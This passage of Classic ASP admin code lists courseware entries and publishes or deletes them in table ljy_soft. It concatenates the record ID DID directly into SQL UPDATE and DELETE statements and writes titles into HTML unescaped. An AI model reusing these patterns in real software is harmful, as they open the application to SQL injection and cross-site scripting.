		Maininfo=Maininfo&" <tr><td width=40 align=right><img src=image/arr.gif></td><td width=350>&nbsp;&nbsp;<a href=# Class=list>"&TaleRS("l_title")&"</a></td><td><a href=admin.asp?action=down&operate=1&op=pass&id="&TaleRS("l_id")&" title='发布 ["&TaleRS("l_title")&"]' class=list onclick="&Chr(34)&"return ask('确认要发布\n["&TaleRS("l_title")&"]吗');"&Chr(34)&">允许发布</a></td><td><a href=admin.asp?action=down&operate=2&op=edit&id="&TaleRS("l_id")&" class=list title='编辑 ["&TaleRS("l_title")&"]'>编辑</a></td><td><a href=admin.asp?action=down&operate=0&op=del&id="&TaleRS("l_id")&" title='删除 ["&TaleRS("l_title")&"]' class=list onclick="&Chr(34)&"return ask('确认要删除\n["&TaleRS("l_title")&"]吗');"&Chr(34)&">删除</a></td></tr>"
		TaleRs.MoveNext
		Loop
	Maininfo=Maininfo&"</Table>"
	Else
		Maininfo="<img src=image/arr.gif>&nbsp;目前还没有课件，请点击右边的菜单进行加入<p>"
	End If

		Maininfo=TableH&Pwidth&Maininfo&TableF
	Set TaleRS=NoThing
End Sub
'
Private Sub PassDate()
	If DID="" Then ErrMsg="<li>数据ID号不能为空,操作失败"
	If ErrMsg="" Then
		Conn.ExeCute("update ljy_soft  set l_post=true  where l_id="&DID&"")
		Maininfo=TableH&Pwidth&"发布成功,请进行其它操作"&TableF
	End IF
	Set ReOperate=NoThing
End Sub
'
Private Sub DelDate()
	If DID="" Then ErrMsg="<li>数据ID号不能为空,删除失败"
	If ErrMsg="" Then
		Conn.ExeCute("Delete*from ljy_soft where l_id="&DID&"")
		Maininfo=TableH&Pwidth&"删除成功,请进行其它操作"&TableF
	End IF
	Set ReOperate=NoThing
End Sub
'
End Class
'
%>